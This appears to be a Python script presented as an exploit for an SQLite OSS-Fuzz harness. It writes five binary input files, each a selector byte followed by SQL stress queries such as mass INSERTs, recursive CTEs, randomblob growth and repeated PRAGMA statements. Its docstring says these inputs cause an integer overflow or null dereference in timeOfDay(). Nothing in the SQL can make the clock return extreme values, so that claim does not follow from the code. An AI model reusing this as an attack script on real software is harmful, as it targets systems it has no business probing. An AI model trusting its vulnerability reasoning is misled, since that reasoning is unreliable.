#!/usr/bin/env python3
"""
SQLite OSS-Fuzz harness vulnerability exploit

Target vulnerability: Double-to-int64 conversion overflow in timeOfDay() function
when xCurrentTime returns extreme double values that cause integer overflow
during multiplication by 86400000.0 (milliseconds per day conversion).

The harness calls timeOfDay() via progress_handler() which is invoked every 10 SQL operations.
We craft SQL that triggers many progress callbacks to hit the vulnerable conversion path.

Secondary target: Potential null pointer dereference in timeOfDay() if sqlite3_vfs_find(0)
returns NULL but clockVfs->xCurrentTime is still called.

Payload structure:
- Byte 0: Selector byte (affects foreign key constraints and execCnt limit)
- Byte 1: Must be '\n' to use custom selector, otherwise defaults to 0xfd
- Remaining bytes: SQL query that triggers many progress callbacks
"""

import struct

# Payload 1: Target the double-to-int64 overflow in timeOfDay()
# Use a selector that maximizes execCnt to trigger more progress callbacks
payload1 = b'\xff\n'  # Selector 0xff with newline separator

# SQL that will cause many operations to trigger progress_handler frequently
# Each INSERT will trigger progress callbacks due to the 10-operation limit
sql1 = b'''
CREATE TABLE t(x);
''' + b'''INSERT INTO t VALUES (1);
''' * 1000  # 1000 INSERTs to guarantee many progress_handler calls

payload1 += sql1

# Payload 2: Alternative approach with recursive CTE to stress the progress handler
payload2 = b'\xff\n'
sql2 = b'''
WITH RECURSIVE cnt(x) AS (
   SELECT 1
   UNION ALL
   SELECT x+1 FROM cnt
   LIMIT 10000
)
SELECT * FROM cnt;
'''
payload2 += sql2

# Payload 3: Combination of table operations that stress memory and progress callbacks
payload3 = b'\xfe\n'
sql3 = b'''
CREATE TABLE stress(id INTEGER, data TEXT);
INSERT INTO stress SELECT 1, hex(randomblob(1000));
INSERT INTO stress SELECT 2, hex(randomblob(1000));
INSERT INTO stress SELECT 3, hex(randomblob(1000));
''' + b'''INSERT INTO stress SELECT id+3, data FROM stress;
''' * 10  # Exponential growth of data

payload3 += sql3

# Payload 4: Focus on triggering the VFS time functions with complex queries
payload4 = b'\x80\n'
sql4 = b'''
CREATE TABLE timing_test AS 
WITH RECURSIVE r(i) AS (
  SELECT 0 UNION ALL SELECT i+1 FROM r WHERE i<5000
)
SELECT i, datetime('now') as ts FROM r;
'''
payload4 += sql4

# Payload 5: Minimal payload to test basic overflow condition
payload5 = b'\x01\n'
sql5 = b'''PRAGMA optimize;''' * 100  # Simple repeated pragma to trigger callbacks
payload5 += sql5

# Write all payloads
with open('x1.bin', 'wb') as f:
    f.write(payload1)

with open('x2.bin', 'wb') as f:
    f.write(payload2)

with open('x3.bin', 'wb') as f:
    f.write(payload3)

with open('x4.bin', 'wb') as f:
    f.write(payload4)

with open('x5.bin', 'wb') as f:
    f.write(payload5)
